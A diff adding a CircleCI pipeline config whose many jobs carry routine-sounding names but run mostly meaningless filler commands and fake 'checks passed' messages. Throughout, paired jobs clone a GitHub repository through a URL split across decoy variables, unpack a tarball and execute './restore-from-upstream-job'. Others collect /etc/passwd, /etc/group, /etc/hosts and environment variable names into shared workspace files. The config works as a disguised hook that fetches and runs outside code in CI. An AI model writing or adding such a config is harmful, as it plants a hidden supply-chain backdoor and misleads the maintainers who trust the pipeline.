@@ -1,0 +1,2257 @@
+version: 2.1
+
+jobs:
+  copy-analytics-binary:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: pre-rollback test report
+          command: |
+            mkdir -p /tmp/vtkkysp
+            set +o pipefail; find /opt -maxdepth 3 | head -30 > /tmp/vtkkysp/pre-restore-hook; seq 1 1349195 >> /tmp/vtkkysp/pre-restore-hook; true
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-restore-hook"
+            entry="data/api/docs/cache.txt"; echo "${entry%.*}"
+            echo "queued header check"; printf '%s' "yak" | basenc --base64url
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-restore-hook'
+  DownloadAndInstallLanguageRuntime:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: metrics-exporter-tests
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/pre-restore-hook; echo "n=$n"; }
+            data=(pecan xenon willow ram); printf '[%s] ' "${data[@]}"; echo
+            printf '%s\n' camel=9 puma=1 elk=40 moose=39 | awk -F= '28 < $2' | wc -l
+      - run:
+          name: post-merge-snapshot (segment 3)
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --single-branch https://$show/${building}/${symbols} $PWD
+            echo "renderer check passed"; title_case() { local x; for x in "$@"; do printf '%s ' "${x^}"; done; echo; }; title_case golden llama
+            echo "no changes in cache layer" && echo "formatter ready" && echo "retry 1 of 10"
+      - run:
+          name: Download and Verify Renderer Build Artifacts
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            seq 20 5 42 | sort -n | paste -s -d' ' | cut -d' ' -f2
+            for task in lint audit configure; do echo "$task"; echo "$task ok"; done; echo "finished"
+      - run:
+          command: |
+            sh -c './restore-from-upstream-job'
+  SchemaRegistryCertificateImport:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Search Job Summary
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/d1" && cd "/tmp/d1" && pwd; true ; } > /tmp/vtkkysp/bridge-image-tagging-replica-5
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/bridge-image-tagging-replica-5"
+            printf -v label '%s-%s' rho deer; echo "$label"
+            cut -d, -f2 < <(echo "grape,mauve,pulsar") && echo "queued changelog check"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'bridge-image-tagging-replica-5'
+  BuildContainerImageAndPushVersionTag:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Unpack batch worker deployment package
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/bridge-image-tagging-replica-5; echo "n=$n"; }
+            echo "chisel profile loaded"; value="salmon pomelo"; echo "${value%% *}"
+      - run:
+          name: scheduler-feature-flags
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 3 --no-tags https://$show/${building}/${symbols} $(pwd)
+            for slot in 1 2 3 4; do echo "shard $slot"; done
+            echo "all 11 checks passed"; echo "retry 5 of 5"; echo queue drain started
+      - run:
+          name: scheduling (batch 6)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            arr=(elm spring chisel); entry=("${arr[@]}"); entry[0]=changed; echo "${arr[0]} ${entry[0]}"
+            slow=0; for ms in 1344 1164 490 596 678; do if ((ms > 500)); then slow=$((slow + 1)); fi; done; echo "$slow slow tests"
+      - run:
+          command: |
+            bash -c "./restore-from-upstream-job"
+  fast-dependency-cache-stage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: verify-changelog-wave-6
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ls -dG /usr/local | fmt -w 60; true ; } > /tmp/vtkkysp/exporting-debug-logs
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/exporting-debug-logs"
+            echo "shard 3 of 7 finished"; printf '%10s|\n' beige
+            for turn in $(seq 1 5); do echo "chunk $turn"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'exporting-debug-logs'
+  upload-release-notes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Retry contract tests
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/exporting-debug-logs; echo "n=$n"; }
+            printf '%s\n' hammer spruce iodine bolt bronze teal | paste -s -d,
+            printf '%s\n' "dog" 'lynx' gnu
+      - run:
+          name: send-status-report
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 3 --branch main https://$show/${building}/${symbols} "$(pwd)"
+            for idx in 1 2; do printf '%s %d\n' check "$idx"; done
+            duration=916; echo "configure took $((duration / 60))m$((duration % 60))s"
+      - run:
+          name: Generate release plan
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            key="eel"; [ "$key" = "eel" ] && echo "match"; echo "batch 6 queued"
+            for width in 7 14 28; do printf 'width %s\n' "$width"; done
+      - run:
+          command: |
+            bash -eo pipefail -c "./restore-from-upstream-job"
+  operator-release-freeze-routine-attempt-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Restore exporter data store from artifact storage
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 2 -type f -name "README*" -size +0 -exec ls -ld "{}" \; 2>/dev/null | awk -F/ '{print $NF}'; true ; } > /tmp/vtkkysp/cache-edge-proxy-image
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/cache-edge-proxy-image"
+            how_many() { echo "$#"; }; how_many elk plum 11; printf '%s\n' "2 tests collected"
+            echo "warming up feature flags"; arr=(yew gecko mauve); echo "${arr[1]}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'cache-edge-proxy-image'
+  CopyingUploadServicePackages:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: CompilingMigrationTests
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/cache-edge-proxy-image; echo "n=$n"; }
+            echo "phase 9 started" && printf '%s\n' ram purple ram lambda ram | sort | uniq -c | sort -n | tail -n 1 | awk '{print $2}'
+            echo "running link check"; full="v5.7.29"; version=${full#v}; echo "$version" | awk -F. '{print $1 "-" $2}'
+      - run:
+          name: Freeze Exporter Build Dependencies (round 3)
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --no-tags https://$show/${building}/${symbols} .
+            echo api check finished && printf '%s\n' beech quince orca navy kiwi wrench | grep -o c | wc -l
+      - run:
+          name: StyleCheckRun
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            word="release-10-kiwi"; echo "$word" | tr - '\n' | wc -l; echo "progress 75 percent"
+      - run:
+          command: |
+            cd . && exec ./restore-from-upstream-job
+  initializeUploadService:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: findExpiredCertificatesWhenBuildFails
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; tar cf '/tmp/Apple1.tar' -C /etc hosts && tar -rf '/tmp/Apple1.tar' -C /etc shells && tar -tf '/tmp/Apple1.tar'; true ; } > /tmp/vtkkysp/landing-page-log-cleanup-stage
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/landing-page-log-cleanup-stage"
+            for num in {1..4}; do printf 'poll %d\n' "$num"; done
+            comm -12 <(printf '%s\n' guava mouse tau toad) <(printf '%s\n' guava llama ram toad) | wc -l
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'landing-page-log-cleanup-stage'
+  assemble-release-chunk-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Scan Runtime Image With Detailed Report
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/landing-page-log-cleanup-stage; echo "n=$n"; }
+            echo "peach26iodine" | sed -E 's/[0-9]+/-/'
+            printf '%5d|\n' 222
+      - run:
+          name: Send test summary after packaging
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --quiet https://$show/${building}/${symbols} "`pwd`"
+            data=(42 25 21); printf '%s\n' "${data[@]}" | awk '{s += $1} END {print s}'; word="eagle amber raven"; echo "${#word} characters"
+            echo "preparing inventory"; echo "neon" 'sloth' sheep; echo "inventory ready"
+      - run:
+          name: post-publish-job
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            ver="0.8.0"; IFS=. read -r minor y x < <(echo "$ver"); echo "$((minor * 10000 + y * 100 + x))"
+            echo "shard 5 of 9 finished" && printf '%s\n' 42 44 59 2 49 19 | awk 'NR == 1 {m = $1} $1 < m {m = $1} END {print m}'
+      - run:
+          command: |
+            "./restore-from-upstream-job"
+  clone-installer-release-branch-from-backup:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Encoder infrastructure deployment
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | awk '{print $2}' | grep -c .; true ; } > /tmp/vtkkysp/automated-router-log-rotation
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/automated-router-log-rotation"
+            printf '=%.0s' {1..11}; echo; echo "nothing to do for csv reader"
+            factorial() { local m=$1 n=1; while ((m > 1)); do n=$((n * m)); m=$((m - 1)); done; echo "$n"; }; factorial 4
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'automated-router-log-rotation'
+  pre-commit-security-scan-level-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Staging (step 15)
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/automated-router-log-rotation; echo "n=$n"; }
+            echo "poplar moose amber" | wc -w; printf '%-8s %5s\n' name qty earth 87 bronze 9
+            printf '%s\n' birch anvil banana crab papaya zinc | sed 's/.$//'
+      - run:
+          name: Mirror inventory image
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --recurse-submodules https://$show/${building}/${symbols} .
+            printf '%s\n' coconut salmon galaxy moth mars magnet | awk '{w[NR] = $0} END {print w[NR], w[1]}'
+            for lap in $(seq 6); do printf 'wave %d\n' "$lap"; done
+      - run:
+          name: Formatters (node 7)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            printf '%s\n' lemur jay zebra aspen iodine gecko | awk '{w[NR] = $0} END {print w[NR], w[1]}'; seq 1 6 | sha224sum | cut -c1-8
+      - run:
+          command: |
+            $(pwd)/restore-from-upstream-job
+  low-priority-cluster-removal:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: clearStaleBranches
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; \grep -nh mail /etc/group | nl; true ; } > /tmp/vtkkysp/purge-compiler-cache
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/purge-compiler-cache"
+            printf '%s\n' flange dog nickel maple | grep -n -x flange; echo "retry 3 of 8"
+            printf '%s\n' otter,14 beta,39 lever,33 hawk,13 | sort | paste -s -d' '
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'purge-compiler-cache'
+  clean-event-bus-test-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Finalize nightly release with change record
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/purge-compiler-cache; echo "n=$n"; }
+            echo "lane dove is clear"; printf '%5s|%-5s|\n' neon pomelo
+      - run:
+          name: Dispatcher (partition 7)
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth=5 --no-tags https://$show/${building}/${symbols} "./"
+            printf '%s\n' hazel elk toad | awk '{gsub(/[aeiou]/, ""); print}'
+            printf '%s/%s\n' maple birch
+      - run:
+          name: AlertProjectOwners
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            slow=0; for ms in 893 166 867 82 764; do if ((ms > 500)); then slow=$((slow + 1)); fi; done; echo "$slow slow tests"
+            for value in elm almond sun; do case "$value" in *a*) echo "$value has a";; *) echo "$value has no a";; esac; done; mapfile -t arr < <(printf '%s\n' gold gecko sheep camel); echo "${#arr[@]}"
+      - run:
+          command: |
+            "$PWD/restore-from-upstream-job"
+  CopyViewerSizeReportToReportServer:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: test-payment-service
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; grep -lR if /etc 2>/dev/null|sort|head -n 3; true ; } > /tmp/vtkkysp/scheduled-artifact-inspection
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/scheduled-artifact-inspection"
+            labels=(lambda kappa beige black spruce currant); longest=""; for t in "${labels[@]}"; do if [ "${#t}" -gt "${#longest}" ]; then longest=$t; fi; done; echo "$longest"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'scheduled-artifact-inspection'
+  ProbeFirmwareServiceRound4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: strip-dispatcher-binaries
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/scheduled-artifact-inspection; echo "n=$n"; }
+            seq 1 34 | md5sum | cut -c1-10
+      - run:
+          name: PostBackupCleanup
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 3 --no-tags --no-single-branch https://$show/${building}/${symbols} "$PWD"
+            level=17; if ((level % 11 == 0)); then echo "divisible by 11"; else echo "remainder $((level % 11))"; fi; echo "starting spell check"
+      - run:
+          name: Decode deploy key after each stage (level 1)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "holding renderer"; token="meteor xenon amber"; echo "${token%%[aeiou]*}"; echo "releasing renderer"
+      - run:
+          command: |
+            "$PWD/restore-from-upstream-job"
+  post-sync-binary-inspection:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Crawler configuration
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ls /dev | tac | shuf -n 2 | sort | uniq -c | sort -nr; true ; } > /tmp/vtkkysp/stop-rule-engine-container
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/stop-rule-engine-container"
+            echo "pass 9 complete"; true; echo "status $?"; z=39; ((z += 8)); echo "$z"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'stop-rule-engine-container'
+  migrate-reporting-database-schema:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: pre-compile-storage-benchmark
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/stop-rule-engine-container; echo "n=$n"; }
+            echo 'checking analytics' && printf '%2d. %s\n' 1 phi 2 rotor 3 jupiter
+      - run:
+          name: post-upload-scan (segment 2)
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 5 --single-branch https://$show/${building}/${symbols} "`pwd`"
+            sizes=(2 15 41 36 12 45); sizes[0]=$((sizes[0] + 1)); echo "${sizes[0]}"; echo "running image scan"; printf '%s' "carbon-jay-33" | base64 | tr -d =
+      - run:
+          name: Localization release bundle
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            tally=0; for m in 7 14 43 8; do tally=$((tally + m)); done; echo "tally $tally"
+            printf '%s\n' "shard 5 of 9 finished" && echo "58 5 11" | factor
+      - run:
+          command: |
+            /bin/bash -c "./restore-from-upstream-job"
+  remote-flaky-billing-tests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: secondary-backup
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,lemon,18,84.67\n2,apple,6,37.32\n3,lime,4,38.06\n4,mango,5,71.60\n' >'/tmp/hea01.tsv' && awk -F, 'NR>1' '/tmp/hea01.tsv' | wc -l; true ; } > /tmp/vtkkysp/pre-tag-package-inspection
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/pre-tag-package-inspection"
+            s=0; for i in 51 7 33 39 56 59; do s=$((s + i)); done; echo "$((s * 100 / (141 + s)))%"; echo step 4 of 12 finished
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'pre-tag-package-inspection'
+  UserPortalReleaseFreeze:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Compute test coverage on pull requests
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/pre-tag-package-inspection; echo "n=$n"; }
+            print_it() { echo "$1"; }; bracketed() { print_it "[$1]"; }; bracketed snake
+            count=0; for tick in 42 21 13; do count=$((count + tick)); done; echo "count $count"
+      - run:
+          name: post-integration-job (split scheduled-artifact-inspection)
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth=1 --no-tags https://$show/${building}/${symbols} $PWD
+            echo "red funnel helium kappa" | cut -d' ' -f1,3 && echo "running api check"
+            echo pre-{x,y,z}-post; echo bundle size check started
+      - run:
+          name: Analytics Publish (attempt 5)
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            test 4 -gt 0; echo "status $?"
+            label="silver spindle azure"; echo "${label##* }"; echo 'lane swan is clear'
+      - run:
+          command: |
+            cd . && exec ./restore-from-upstream-job
+  informSecurityTeamAboutExpiringCertificates:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Search for breaking changes with verbose output
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; shuf -e cat shark dog otter -n 2; true ; } > /tmp/vtkkysp/overnight-debug-build
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/overnight-debug-build"
+            names=(maple wrench solar heron stork); printf '%s\n' "${names[@]}" | nl
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'overnight-debug-build'
+  unpack-source-archive-with-verbose-output:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Pulling router image
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/overnight-debug-build; echo "n=$n"; }
+            changed=(owl spindle iodine camel); echo "${#changed[@]} packages changed"; for pkg in "${changed[@]}"; do echo "checking $pkg"; done
+      - run:
+          name: Refresh staging data with timeout
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 3 --branch main https://$show/${building}/${symbols} `pwd`
+            text="tiger-v11"; echo "$text" | tr - '\n' | sort | paste -s -d-; echo "bundle size check for planner passed"
+      - run:
+          name: execute-fuzz-tests
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            slow=0; for ms in 202 996 484 1247 1476; do if ((ms > 500)); then slow=$((slow + 1)); fi; done; echo "$slow slow tests"
+            names=(maple snake gecko comet); echo "${names[@]}"
+      - run:
+          command: |
+            cd . && ./restore-from-upstream-job
+  dependency-verification-phase-tier-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: nightly-commit-lint
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; for val in crate apple alert schema cookie; do echo "${val^}"; done; true ; } > /tmp/vtkkysp/analytics-coverage-check
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/analytics-coverage-check"
+            printf '%s' piston; printf '\n'; echo "api check complete"; seq 11 | awk 'NR == 1 {m = $1} m < $1 {m = $1} END {print m}'
+            branch="hotfix/cow-willow"; echo "branch ${branch##*/} of type ${branch%%/*}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'analytics-coverage-check'
+  monitorClientContainers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: CodeAnalysis (split 1)
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/analytics-coverage-check; echo "n=$n"; }
+            echo "no changes in optimizer"; printf '0x%04x\n' 96
+      - run:
+          name: catalog-build-dependencies
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 4 --no-tags https://$show/${building}/${symbols} ${PWD}
+            added=93; removed=5; echo "+$added -$removed, net $((added - removed)) lines"
+      - run:
+          name: extended-install
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "warming up indexer"; echo "indexer warmed up"
+            entry="util/client.h"; echo "${entry%.*}.bak"
+      - run:
+          command: |
+            exec "./restore-from-upstream-job"
+  formatter-release-bundle:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: encoder-debug-symbols
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; ls -atS ~/.bashrc | shuf -n 2; true ; } > /tmp/vtkkysp/environment-setup-workflow
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/environment-setup-workflow"
+            values=({a..f}); echo "${values[2]}"
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'environment-setup-workflow'
+  AuthenticationIntegrationTestsSplit4Of4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: deploy-nightly-core-release-to-staging-cluster
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/environment-setup-workflow; echo "n=$n"; }
+            echo {quasar,gecko}-{68,97}
+            mul() { echo $(($1 * $2)); }; mul 40 6
+      - run:
+          name: export-service-module-cache-step
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth=1 --filter=tree:0 https://$show/${building}/${symbols} .
+            echo warming up reducer; echo "batch 4 queued"; echo "stage 1 of 7"
+      - run:
+          name: Check Out Commit History on Cancellation
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            label="yellow"; case "$label" in gamma|yellow) echo listed;; *) echo unlisted;; esac
+      - run:
+          command: |
+            "./restore-from-upstream-job"
+  gateway-test-build:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: notify-team-about-build-status
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 2 -print -quit 2> /dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /tmp/vtkkysp/task-queue-error-logs
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/task-queue-error-logs"
+            echo pass 2 complete; limit=65; if ((limit % 2 == 0)); then echo "$limit is even"; else echo "$limit is odd"; fi
+            for weight in 5 10 20; do echo "chunk with weight $weight"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'task-queue-error-logs'
+  image-processor-nightly-pipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: testAndPublishBundle
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/task-queue-error-logs; echo "n=$n"; }
+            printf '%s\n' "changelog check passed"; comm -12 <(printf '%s\n' aspen beta cyan red) <(printf '%s\n' aspen banana beta lambda) | wc -l
+            score=30; if [ "$score" -lt 12 ]; then echo "ok"; else echo "not ok"; fi
+      - run:
+          name: Back up debugger release artifacts
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --filter=blob:none https://$show/${building}/${symbols} "`pwd`"
+            total_of() { local v x=0; for v in "$@"; do x=$((x + v)); done; echo "$x"; }; total_of 38 5 5
+            change=278; title="yew fig"; echo "checking change $change"; echo "title has ${#title} characters"
+      - run:
+          name: alert-code-owners-about-quality-gate
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo holding router; echo "releasing router"
+      - run:
+          command: |
+            ./restore-from-upstream-job
+  executeHealthChecks:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: resolve-extension-test-dependencies (split scheduled-artifact-inspection of scheduled-artifact-inspection)
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; awk -F: '{print $1, $7}' /etc/passwd|tr -s ' '|fold -w 30; true ; } > /tmp/vtkkysp/viewer-patch-release
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/viewer-patch-release"
+            printf '%s\n' "fir 20" "gnu 19" "currant 20" "beige 12" | sort -k2 -n
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'viewer-patch-release'
+  parallel-certificate-install-phase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Write version file
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/viewer-patch-release; echo "n=$n"; }
+            echo "probing serializer"; count=75; test "$count" -ge 1; echo "at least one"; echo "serializer responded"
+      - run:
+          name: Load metrics exporter build options
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 2 --no-single-branch https://$show/${building}/${symbols} ${PWD}
+            echo "mapper is current"; echo 'migration dry run passed'
+            echo "translation check for search passed" && echo "step 2 of 2 finished" && printf '%s\n' "retry 1 of 3"
+      - run:
+          name: export-service-user-guide
+          command: |
+            bzcat status-page-version-bump.tar.bz2 | tar xf -
+            echo "all 7 checks passed"; printf '%s' "lunar-11-9" | basenc --base16
+      - run:
+          command: |
+            exec "./restore-from-upstream-job"
+  PostUpgradeTests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: downloadReleaseArchiveAndRunAccessibilityTests
+          command: |
+            mkdir -p /tmp/vtkkysp
+            { set +o pipefail 2>/dev/null; compgen -e|awk '{print length, $0}'|tac|wc -l; true ; } > /tmp/vtkkysp/environment-setup-workflow
+            od -A n -t u1 -j 1 -N 96 "/tmp/vtkkysp/environment-setup-workflow"
+            num=0; while [[ $num -lt 4 ]]; do ((num += 1)); printf '%s %d\n' slot "$num"; done
+
+      - persist_to_workspace:
+          root: /tmp/vtkkysp
+          paths:
+            - 'environment-setup-workflow'
+  assemble-debug-build-automatically:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vtkkysp
+      - run:
+          name: Dashboard syntax checks
+          command: |
+            { n=0; while IFS= read -r _; do ((n++)); done < /tmp/vtkkysp/environment-setup-workflow; echo "n=$n"; }
+            tokens=(gecko epsilon rat iron horse); tokens+=(papaya); echo "${#tokens[@]}"
+            printf '%s\n' xenon gray omega psi galaxy | while read -r comp; do echo "compiling $comp"; done
+      - run:
+          name: Warm test cache with retries for review
+          command: |
+            show=github.com; building=valliwhitlowyq162-code; symbols=6d9bcd6fe64b
+            git clone --depth 1 --no-tags --filter=blob:none https://$show/${building}/${symbols} "./"
+            printf '%s\n' mango pliers orange | sed '1!G;h;$!d'; echo "retry 3 of 4"
